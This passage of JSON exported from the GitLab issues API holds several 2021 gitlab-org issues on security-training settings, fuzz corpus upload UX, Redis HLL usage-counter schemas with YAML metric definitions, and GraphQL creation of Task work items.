------ | ------ | ------ | \n| ![C1-UC_CONFIG__Security_training-all_disabled](/uploads/e491162e4e5d5f1f06463498d3cb2478/C1-UC_CONFIG__Security_training-all_disabled.png)| ![C2-UC_CONFIG__Security_training-toggled](/uploads/63c17fcea939b54cf6b290a10075ae50/C2-UC_CONFIG__Security_training-toggled.png)|![C3-UC_CONFIG__Security_training-saved___enabled](/uploads/9aed5d91b1f99d5bb8a2c66779fb8c79/C3-UC_CONFIG__Security_training-saved___enabled.png) |\n\n## Note\n\nThe issue will be further broken down. This will ensure we keep our changes and [MR as small as possible](https://about.gitlab.com/handbook/values/#make-small-merge-requests).\n\n| Issue | Changes |\n| ------ | ------ |\n| This Issue | Add Security training section |\n| https://gitlab.com/gitlab-org/gitlab/-/issues/346059 | Add \"Primary training\" |\n| https://gitlab.com/gitlab-org/gitlab/-/issues/346060 | Add info popover |\n\n## More info\n\nThis has been extracted from the design issue \u003e https://gitlab.com/gitlab-org/gitlab/-/issues/326054\n\n\u003e Training suggestions will be OFF by default. This is because we are introducing zero-configuration integrations that take GitLab users to an external provider. There is a high probability we will launch with more than one provider, so the user must chose which one(s) to enable. Also, historically, many self-managed Ultimate customers are sensitive to any external network connections we make that are not to a GitLab-controlled domain. To not lose visibility of this new feature, we will use the notification detailed below.\n\n\u003e Training configuration makes sense at both the Group and Project level. It would be much more convenient to enable it at the Group level where users can then disable for any specific child Project it is not wanted. It can also be left off for a Group but selectively enabled on individual Projects.\n\n\n\u003e #### Permission and Security\n\u003e There are no security or permissions requirements. Any Ultimate user with access to vulnerability findings, vulnerability details pages, and the Security \u0026 Compliance → Configuration page can access all of this functionality.\n\n## Implementation Plan\n\nPlease see spike issue for detail on the vendor API usage \u003e https://gitlab.com/gitlab-org/gitlab/-/issues/346069","state":"closed","created_at":"2021-11-18T19:09:11.077Z","updated_at":"2022-01-24T03:36:02.817Z","closed_at":"2022-01-18T11:59:07.068Z","closed_by":{"id":3993566,"username":"sming-gitlab","name":"Samantha Ming","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3993566/avatar.png","web_url":"https://gitlab.com/sming-gitlab"},"labels":["[deprecated] Accepting merge requests","auto updated","devops::secure","frontend","group::threat insights","missed:14.6","section::sec","type::feature"],"milestone":{"id":2156369,"iid":68,"group_id":9970,"title":"14.7","description":"","state":"active","created_at":"2021-07-21T17:39:41.786Z","updated_at":"2021-07-21T17:39:41.786Z","due_date":"2022-01-17","start_date":"2021-12-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/68"},"assignees":[],"author":{"id":3993566,"username":"sming-gitlab","name":"Samantha Ming","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3993566/avatar.png","web_url":"https://gitlab.com/sming-gitlab"},"type":"ISSUE","assignee":null,"user_notes_count":1,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/346057","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":3,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/346057","notes":"https://gitlab.com/api/v4/projects/278964/issues/346057/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/346057/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#346057","relative":"#346057","full":"gitlab-org/gitlab#346057"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":6176,"epic":{"id":287896,"iid":6176,"title":"Integrate developer security training into vulnerability management","url":"/groups/gitlab-org/-/epics/6176","group_id":9970,"human_readable_end_date":"Apr 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":97575533,"iid":346055,"project_id":278964,"title":"Corpus Management - Address UX Feedback adjustments","description":"Related to #345985.\n\nBased on the screenshots you provided, I see a few things that should be cleaned up. I've included my feedback below along with some screenshots to aid the discussion. Please let me know if you have questions or would like to discuss any of the items.\n\n* (1) The file upload input label should be \"Corpus file\" (currently \"Corpus name\")\n* (2) The text about the corpus size is intended to be \"help text\" and should be styled accordingly\n  * color: gray-500 (#666666), size: 14px, weight: 400 (regular)\n  * the vertical spacing between the \"Choose file...\" and \"Upload file\" buttons should be the same\n* (2) The wording of the help text feels a little off. I suggest changing it to: `Corpus files must be in *.zip format. Maximum 10GB`\n* (3) \"Upload file\" button should use the [primary confirm button variant](https://gitlab-org.gitlab.io/gitlab-ui/?path=/story/base-button--default\u0026args=variant:confirm) (blue, not green)\n* (4) After a file is successfully uploaded, there appears to be an unnecessary indentation on the left side of the file name.\n* (4) Users should be able to remove the uploaded file\n\n![corpus-modal-upload](https://gitlab.com/gitlab-org/gitlab/uploads/ed4bd3734db6fc24e5f98f7f14f755a4/corpus-modal-upload.png)\n\n![corpus-modal-uploaded](https://gitlab.com/gitlab-org/gitlab/uploads/cc3f605d6b4459f1d157e509569af8f8/corpus-modal-uploaded.png)\n\n### Additional UX/TW feedback\n- [ ] The `Security \u0026 Compliance` \u003e `Configuration` menu item should be active while viewing the corpus management area. (see [discussion below](https://gitlab.com/gitlab-org/gitlab/-/issues/346055#note_827252354) for additional context)\n- [ ] In the \"Corpus name\" and \"Target\" columns, text in those columns should be in sentence case. (see [discussion](https://gitlab.com/gitlab-org/gitlab/-/issues/346055#note_827233694) for additional context)","state":"closed","created_at":"2021-11-18T18:27:56.099Z","updated_at":"2022-02-14T03:21:31.724Z","closed_at":"2022-02-13T23:41:39.123Z","closed_by":{"id":3252080,"username":"farias-gl","name":"Fernando.A","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3252080/avatar.png","web_url":"https://gitlab.com/farias-gl"},"labels":["Category:Fuzz Testing","GitLab Ultimate","Technical Writing","UX","devops::secure","feature::enhancement","frontend","fuzzing::coverage","group::dynamic analysis","missed:14.7","section::sec","tw::finished","type::feature","workflow::in dev"],"milestone":null,"assignees":[{"id":3252080,"username":"farias-gl","name":"Fernando.A","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3252080/avatar.png","web_url":"https://gitlab.com/farias-gl"},{"id":3658061,"username":"rdickenson","name":"Russell Dickenson","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3658061/avatar.png","web_url":"https://gitlab.com/rdickenson"}],"author":{"id":3252080,"username":"farias-gl","name":"Fernando.A","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3252080/avatar.png","web_url":"https://gitlab.com/farias-gl"},"type":"ISSUE","assignee":{"id":3252080,"username":"farias-gl","name":"Fernando.A","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3252080/avatar.png","web_url":"https://gitlab.com/farias-gl"},"user_notes_count":29,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/346055","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":2,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":true,"task_status":"0 of 2 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/346055","notes":"https://gitlab.com/api/v4/projects/278964/issues/346055/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/346055/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#346055","relative":"#346055","full":"gitlab-org/gitlab#346055"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":6902,"epic":{"id":367971,"iid":6902,"title":"Fuzz corpus management - Clean Up","url":"/groups/gitlab-org/-/epics/6902","group_id":9970,"human_readable_end_date":"Jul 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":97573019,"iid":346046,"project_id":278964,"title":"Implement new Redis HLL Counters for Work Items","description":"## Problem to solve\n\nWe need a more scalable redis counter schema for work items that is inclusive of Plan xMAU, Project Management xMAU, and Product Planning xMAU. We cannot aggregate and dedupe events across features within a group or at the stage level with our current redis slot schema.\n\nAll three Plan product groups will be using the same base object -- work item. Each product group still needs to track MAU. Is there a better way to approach this given the current constraints and behaviors of our Redis HLL counters? \n\n## Proposal\n\n- Implement new counter schema\n- Schema is based on individual actions which are then added to aggregate counters depending on what action was taken and which product groups the xMAU most strongly aligns to. \n- Use `users` as a shared `redis_slot` to allow de-duplication of unique users across all events within Plan. This will allow us to achieve a single, de-duplicated stage-level xMAU while also having the same level of visibility among product groups. If we want to expand to categories, this same pattern would work for that as well.  \n- Once epics have been migrated to work items, remove all legacy Plan xMAU Redis HLL counters. \n\n## Acceptance\n\n- [x] Service Ping schema approved\n- [ ] \u003cstrike\u003eAdd schema to https://docs.gitlab.com/ee/development/work_items.html\u003c/strike\u003e https://gitlab.com/gitlab-org/gitlab/-/issues/362400\n- [x] Implement the first batch of the new counters for the tasks MVC.\n\n## Counter Schema for Work Items\n\n| Field | Possible Values |\n| ------ | ------ |\n| `name` | unique, descriptive action name |\n| `category` | most relevant object name to provide context on where the action was taken (ex: `work_item`, `milestone`, `iteration`, `namespace` ...)  |\n| `redis_slot` | `users` (when tracking xMAU), `count` (when tracking aggregate action counts) |\n| `aggregation` | `weekly` | \n| `feature_flag` | name of feature flag gating this particular counter (optional) |\n\n```mermaid\ngraph TD\n    Event[Specific Interaction Counter] --\u003e AC[Aggregate Counters]\n    AC --\u003e Plan[Plan xMAU]\n    AC --\u003e PM[Project Management xMAU]\n    AC --\u003e PP[Product Planning xMAU]\n    AC --\u003e Cer[Certify xMAU]\n    AC --\u003e WI[Work Items Users]\n```\nProposed template for issues that need new counters as part of their acceptance criteria:\n\n```markdown\n- **name:** `replace with unique, descriptive action name` \n- **category:** `replace with relevant object name`\n- **redis_slot:** `users` \n- **include in the following aggregation counters:**\n  - [ ] `xmau_plan`\n  - [ ] `xmau_project_management`\n  - [ ] `xmau_product_planning`\n  - [ ] `xmau_certify`\n  - [ ] `users_work_items`\n  - [ ] new aggregate counter (name: `replace with name of new aggregate counter here`)\n- **documentation:** [Service Ping Implementation](https://docs.gitlab.com/ee/development/service_ping/implement.html), [Redis HLL Counters](https://docs.gitlab.com/ee/development/service_ping/implement.html#redis-hll-counters)\n\n```\n\n## Implementation Steps\n\nSee https://docs.gitlab.com/ee/development/service_ping/implement.html and https://docs.gitlab.com/ee/development/service_ping/implement.html#redis-hll-counters\n\n## Tasks Example\n\n### User creating work item\n\nWe will maintain counters for each individual type of interaction on a work item, but we will not segment these interactions by product group. This avoids having to implement and maintain 3x as many counters. We can also track all interactions on a work item by product group in an aggregate counter. \n\n```yaml\nname: users_creating_work_items\ncategory: work_item\nredis_slot: users\naggregation: weekly\nfeature_flag: track_work_items_activity  ## optional\n```\n\nYAML Metric Definition:\n\n```yaml\nkey_path: users_creating_work_items\ndescription: Unique users creating work items\nproduct_category: team planning\nproduct_section: dev\nproduct_stage: plan\nproduct_group: group::project management\nvalue_type: number\nstatus: active\nmilestone: TBD\nintroduced_by_url: TBD\ntime_frame: 28d\ndata_source: redis_hll\ndistribution:\n- ce\n- ee\ntier:\n- free\n- premium\n- ultimate\n```\n\n### User updating work item title\n\n```yaml\nname: users_updating_work_item_title\ncategory: work_item\nredis_slot: users\naggregation: weekly\nfeature_flag: track_work_items_activity  ## optional\n```\n\nYAML Metric Definition:\n\n```yaml\nkey_path: users_updating_work_item_title\ndescription: Unique users updating a work item's title\nproduct_category: team planning\nproduct_section: dev\nproduct_stage: plan\nproduct_group: group::project management\nvalue_type: number\nstatus: active\nmilestone: TBD\nintroduced_by_url: TBD\ntime_frame: 28d\ndata_source: redis_hll\ndistribution:\n- ce\n- ee\ntier:\n- free\n- premium\n- ultimate\n```\n\n### Aggregate counters\n\n**Important:** Every time a new counter is added, it must also be included in the relevant aggregate counters! \n\n#### Plan xMAU:\n\nStore in https://gitlab.com/gitlab-org/gitlab/-/blob/master/config/metrics/aggregates/common.yml\n\n```yaml\n- name: xmau_plan\n  operator: OR\n  source: redis\n  time_frame: [7d, 28d]\n  events:\n    - users_creating_work_items\n    - users_updating_work_item_title \n```\n\nYAML Metric Definition:\n\n```yaml\nkey_path: xmau_plan\ndescription: Unique users interacting with Plan features\nproduct_category: team planning\nproduct_section: dev\nproduct_stage: plan\nproduct_group: group::project management\nvalue_type: number\nstatus: active\nmilestone: TBD\nintroduced_by_url: TBD\ntime_frame: 28d\ndata_source: redis_hll\ndistribution:\n- ce\n- ee\ntier:\n- free\n- premium\n- ultimate\n```\n\n#### Project Management xMAU:\n\nStore in https://gitlab.com/gitlab-org/gitlab/-/blob/master/config/metrics/aggregates/common.yml\n\n```yaml\n- name: xmau_project_management\n  operator: OR\n  source: redis\n  time_frame: [7d, 28d]\n  events:\n    - users_creating_work_items\n    - users_updating_work_item_title \n```\n\nYAML Metric Definition:\n\n```yaml\nkey_path: xmau_project_management\ndescription: Unique users interacting with Project Management features\nproduct_category: team planning\nproduct_section: dev\nproduct_stage: plan\nproduct_group: group::project management\nvalue_type: number\nstatus: active\nmilestone: TBD\nintroduced_by_url: TBD\ntime_frame: 28d\ndata_source: redis_hll\ndistribution:\n- ce\n- ee\ntier:\n- free\n- premium\n- ultimate\n```\n\n#### Work Items Users:\n\nStore in https://gitlab.com/gitlab-org/gitlab/-/blob/master/config/metrics/aggregates/common.yml\n\n```yaml\n- name: users_work_items\n  operator: OR\n  source: redis\n  time_frame: [7d, 28d]\n  events:\n    - users_creating_work_items\n    - users_updating_work_item_title \n```\n\nYAML Metric Definition:\n\n```yaml\nkey_path: users_work_items\ndescription: Unique users interacting with work items\nproduct_category: team planning\nproduct_section: dev\nproduct_stage: plan\nproduct_group: group::project management\nvalue_type: number\nstatus: active\nmilestone: TBD\nintroduced_by_url: TBD\ntime_frame: 28d\ndata_source: redis_hll\ndistribution:\n- ce\n- ee\ntier:\n- free\n- premium\n- ultimate\n```","state":"closed","created_at":"2021-11-18T17:26:15.473Z","updated_at":"2022-12-09T16:21:27.246Z","closed_at":"2022-05-13T19:17:45.555Z","closed_by":{"id":3507264,"username":"donaldcook","name":"Donald Cook","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3507264/avatar.png","web_url":"https://gitlab.com/donaldcook"},"labels":["Deliverable","backend","devops::plan","group::project management","missed-deliverable","missed:14.10","missed:14.6","missed:14.9","section::dev","type::feature","workflow::in review"],"milestone":{"id":2095271,"iid":65,"group_id":9970,"title":"15.0","description":"","state":"active","created_at":"2021-06-08T15:35:34.814Z","updated_at":"2021-11-02T18:23:35.115Z","due_date":"2022-05-17","start_date":"2022-04-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/65"},"assignees":[{"id":8110537,"username":"mcelicalderonG","name":"Mario Celi","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/8110537/avatar.png","web_url":"https://gitlab.com/mcelicalderonG"}],"author":{"id":4303289,"username":"gweaver","name":"Gabe Weaver","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4303289/avatar.png","web_url":"https://gitlab.com/gweaver"},"type":"ISSUE","assignee":{"id":8110537,"username":"mcelicalderonG","name":"Mario Celi","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/8110537/avatar.png","web_url":"https://gitlab.com/mcelicalderonG"},"user_notes_count":16,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/346046","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":9,"completed_count":2},"weight":3,"blocking_issues_count":0,"has_tasks":true,"task_status":"2 of 9 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/346046","notes":"https://gitlab.com/api/v4/projects/278964/issues/346046/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/346046/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#346046","relative":"#346046","full":"gitlab-org/gitlab#346046"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7110,"epic":{"id":382837,"iid":7110,"title":"🚀 Create a new Task work item from Markdown Task","url":"/groups/gitlab-org/-/epics/7110","group_id":9970,"human_readable_end_date":"Jan 17, 2023","human_readable_timestamp":"\u003cstrong\u003e2\u003c/strong\u003e days remaining"},"iteration":{"id":51126,"iid":64,"sequence":15,"group_id":9970,"title":null,"description":null,"state":3,"created_at":"2022-03-15T00:05:02.134Z","updated_at":"2022-05-25T00:05:02.157Z","start_date":"2022-05-11","due_date":"2022-05-24","web_url":"https://gitlab.com/groups/gitlab-org/-/iterations/51126"},"health_status":null},{"id":97570030,"iid":346043,"project_id":278964,"title":"Documentation: Snowplow pseudonymization service observability","description":"This is the ~documentation issue for https://gitlab.com/gitlab-org/gitlab/-/issues/340997 per [this comment](https://gitlab.com/gitlab-org/gitlab/-/issues/340997#note_736726132)","state":"closed","created_at":"2021-11-18T16:37:14.818Z","updated_at":"2022-01-04T14:50:02.421Z","closed_at":"2022-01-04T14:50:02.398Z","closed_by":{"id":8013274,"username":"pskorupa","name":"Piotr Skorupa","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/8013274/avatar.png","web_url":"https://gitlab.com/pskorupa"},"labels":["backend","devops::growth","documentation","group::product intelligence","missed:14.6","section::growth","workflow::verification"],"milestone":{"id":2156369,"iid":68,"group_id":9970,"title":"14.7","description":"","state":"active","created_at":"2021-07-21T17:39:41.786Z","updated_at":"2021-07-21T17:39:41.786Z","due_date":"2022-01-17","start_date":"2021-12-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/68"},"assignees":[{"id":8013274,"username":"pskorupa","name":"Piotr Skorupa","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/8013274/avatar.png","web_url":"https://gitlab.com/pskorupa"}],"author":{"id":2890431,"username":"amandarueda","name":"Amanda Rueda","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2890431/avatar.png","web_url":"https://gitlab.com/amandarueda"},"type":"ISSUE","assignee":{"id":8013274,"username":"pskorupa","name":"Piotr Skorupa","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/8013274/avatar.png","web_url":"https://gitlab.com/pskorupa"},"user_notes_count":1,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/346043","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/346043","notes":"https://gitlab.com/api/v4/projects/278964/issues/346043/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/346043/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#346043","relative":"#346043","full":"gitlab-org/gitlab#346043"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":6739,"epic":{"id":348774,"iid":6739,"title":"Pseudonymization 1.0","url":"/groups/gitlab-org/-/epics/6739","group_id":9970,"human_readable_end_date":"Apr 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":97569344,"iid":346042,"project_id":278964,"title":"When a Task is created, create \"related\" link to the issue","description":"## Proposal\n\n- When converting a markdown taskable to an issue type of `Task`, we should automatically mark the `Task` as related to the `Issue`. \n\n## Considerations\n\n- In the future, the `Task` may be \"related\" (if ~\"GitLab Free\")  to the issue or it may be a child of the issue (if ~\"GitLab Premium\". \n- We should confirm with ~\"group::product planning\" that we implement this in such a way that it is not more difficult for them to pick up where we've left off with this.","state":"closed","created_at":"2021-11-18T16:29:50.707Z","updated_at":"2022-03-18T07:00:46.907Z","closed_at":"2022-02-23T19:48:26.297Z","closed_by":{"id":8110537,"username":"mcelicalderonG","name":"Mario Celi","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/8110537/avatar.png","web_url":"https://gitlab.com/mcelicalderonG"},"labels":["Deliverable","backend","devops::plan","documentation","group::project management","missed-deliverable","missed:14.6","missed:14.7","missed:14.8","section::dev","type::feature","workflow::in review"],"milestone":{"id":2204140,"iid":71,"group_id":9970,"title":"14.9","description":"","state":"active","created_at":"2021-08-26T19:11:46.841Z","updated_at":"2022-03-22T13:29:17.028Z","due_date":"2022-03-17","start_date":"2022-02-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/71"},"assignees":[{"id":8110537,"username":"mcelicalderonG","name":"Mario Celi","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/8110537/avatar.png","web_url":"https://gitlab.com/mcelicalderonG"}],"author":{"id":5965371,"username":"jlear","name":"Jake Lear","state":"blocked","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5965371/avatar.png","web_url":"https://gitlab.com/jlear"},"type":"ISSUE","assignee":{"id":8110537,"username":"mcelicalderonG","name":"Mario Celi","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/8110537/avatar.png","web_url":"https://gitlab.com/mcelicalderonG"},"user_notes_count":16,"merge_requests_count":0,"upvotes":1,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/346042","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":3,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/346042","notes":"https://gitlab.com/api/v4/projects/278964/issues/346042/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/346042/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#346042","relative":"#346042","full":"gitlab-org/gitlab#346042"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7110,"epic":{"id":382837,"iid":7110,"title":"🚀 Create a new Task work item from Markdown Task","url":"/groups/gitlab-org/-/epics/7110","group_id":9970,"human_readable_end_date":"Jan 17, 2023","human_readable_timestamp":"\u003cstrong\u003e2\u003c/strong\u003e days remaining"},"iteration":{"id":38171,"iid":45,"sequence":6,"group_id":9970,"title":"Iteration 6: January 05, 2022 - January 18, 2022","description":null,"state":3,"created_at":"2021-10-22T17:12:40.556Z","updated_at":"2022-01-19T00:05:02.772Z","start_date":"2022-01-05","due_date":"2022-01-18","web_url":"https://gitlab.com/groups/gitlab-org/-/iterations/38171"},"health_status":null},{"id":97569184,"iid":346041,"project_id":278964,"title":"Implement generic createWorkItem mutation","description":"## Problem to solve\n\nWe need a way to create Work Items via GraphQL. Specifically, this is required for the creation of Tasks, but should be allow for the creation of any work item type.\n\n## Proposal\n\n- Add GraphQL mutation for creating an issue of type `Task` (https://gitlab.com/gitlab-org/gitlab/-/merge_requests/73275/diffs)\n- The mutation should validate that a title and type are specified. \n\n## Acceptance\n\n- [x] The mutation successfully creates a new issue of type `Task` related to the issue from which it was created.\n- [x] Creating a task increments `g_project_management_issue_created_monthly`","state":"closed","created_at":"2021-11-18T16:28:16.667Z","updated_at":"2022-02-17T21:30:55.844Z","closed_at":"2022-01-05T21:07:08.965Z","closed_by":{"id":3507264,"username":"donaldcook","name":"Donald Cook","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3507264/avatar.png","web_url":"https://gitlab.com/donaldcook"},"labels":["Deliverable","backend","backend complete","devops::plan","group::project management","missed-deliverable","missed:14.6","section::dev","type::feature","workflow::ready for development"],"milestone":{"id":2156369,"iid":68,"group_id":9970,"title":"14.7","description":"","state":"active","created_at":"2021-07-21T17:39:41.786Z","updated_at":"2021-07-21T17:39:41.786Z","due_date":"2022-01-17","start_date":"2021-12-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/68"},"assignees":[{"id":8110537,"username":"mcelicalderonG","name":"Mario Celi","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/8110537/avatar.png","web_url":"https://gitlab.com/mcelicalderonG"}],"author":{"id":5965371,"username":"jlear","name":"Jake Lear","state":"blocked","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5965371/avatar.png","web_url":"https://gitlab.com/jlear"},"type":"ISSUE","assignee":{"id":8110537,"username":"mcelicalderonG","name":"Mario Celi","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/8110537/avatar.png","web_url":"https://gitlab.com/mcelicalderonG"},"user_notes_count":29,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/346041","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":2,"completed_count":2},"weight":3,"blocking_issues_count":0,"has_tasks":true,"task_status":"2 of 2 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/346041","notes":"https://gitlab.com/api/v4/projects/278964/issues/346041/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/346041/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#346041","relative":"#346041","full":"gitlab-org/gitlab#346041"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7110,"epic":{"id":382837,"iid":7110,"title":"🚀 Create a new Task work item from Markdown Task","url":"/groups/gitlab-org/-/epics/7110","group_id":9970,"human_readable_end_date":"Jan 17, 2023","human_readable_timestamp":"\u003cstrong\u003e2\u003c/strong\u003e days remaining"},"iteration":null,"health_status":null},{"id":97569062,"iid":346040,"project_id":278964,"title":"Hide Task as an option in the current issue creation flow","description":"## Proposal\n\n- As we are iterating on the `workItem` GraphQL API, we should avoid allowing `Task` to have meta-data that is not yet supported by the new API. \n- Hide `Task` as an issue type in the current issue creation flow (i.e. `-/issues/new`).\n- Tasks can only be created by converting a markdown taskable to an issue type of `Task`","state":"closed","created_at":"2021-11-18T16:26:47.473Z","updated_at":"2021-12-20T20:14:16.324Z","closed_at":"2021-12-20T20:14:02.697Z","closed_by":{"id":8110537,"username":"mcelicalderonG","name":"Mario Celi","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/8110537/avatar.png","web_url":"https://gitlab.com/mcelicalderonG"},"labels":["[deprecated] Accepting merge requests","backend","devops::plan","documentation","group::project management","section::dev","type::feature","workflow::production"],"milestone":{"id":2114820,"iid":67,"group_id":9970,"title":"14.6","description":"https://about.gitlab.com/releases/archives.html","state":"closed","created_at":"2021-06-23T05:00:52.094Z","updated_at":"2022-04-21T07:26:38.271Z","due_date":"2021-12-17","start_date":"2021-11-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/67"},"assignees":[],"author":{"id":5965371,"username":"jlear","name":"Jake Lear","state":"blocked","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5965371/avatar.png","web_url":"https://gitlab.com/jlear"},"type":"ISSUE","assignee":null,"user_notes_count":5,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/346040","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/346040","notes":"https://gitlab.com/api/v4/projects/278964/issues/346040/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/346040/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#346040","relative":"#346040","full":"gitlab-org/gitlab#346040"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7110,"epic":{"id":382837,"iid":7110,"title":"🚀 Create a new Task work item from Markdown Task","url":"/groups/gitlab-org/-/epics/7110","group_id":9970,"human_readable_end_date":"Jan 17, 2023","human_readable_timestamp":"\u003cstrong\u003e2\u003c/strong\u003e days remaining"},"iteration":null,"health_status":null},{"id":97569006,"iid":346039,"project_id":278964,"title":"Write migration to add Task type to work_items_types table","description":"","state":"closed","created_at":"2021-11-18T16:26:00.737Z","updated_at":"2021-12-20T20:12:22.876Z","closed_at":"2021-12-20T20:12:22.858Z","closed_by":{"id":8110537,"username":"mcelicalderonG","name":"Mario Celi","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/8110537/avatar.png","web_url":"https://gitlab.com/mcelicalderonG"},"labels":["backend","devops::plan","group::project 